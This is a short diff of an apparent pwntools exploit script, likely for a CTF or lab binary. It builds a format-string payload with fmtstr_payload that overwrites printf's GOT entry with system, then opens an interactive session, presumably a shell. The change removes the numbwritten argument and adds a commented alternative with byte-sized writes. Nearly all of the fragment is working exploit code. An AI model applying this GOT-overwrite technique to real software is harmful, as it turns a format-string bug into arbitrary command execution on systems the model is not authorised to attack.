@@ -61,7 +61,8 @@ def exploit(*args, **kwargs):
 		printf_got: system,
 	}}
 
-	pl = fmtstr_payload(offset, writes, numbwritten=0)
+	pl = fmtstr_payload(offset, writes)
+	# pl = fmtstr_payload(offset, writes, numbwritten=0, strategy='small', write_size='byte')
 
 
     io.interactive()
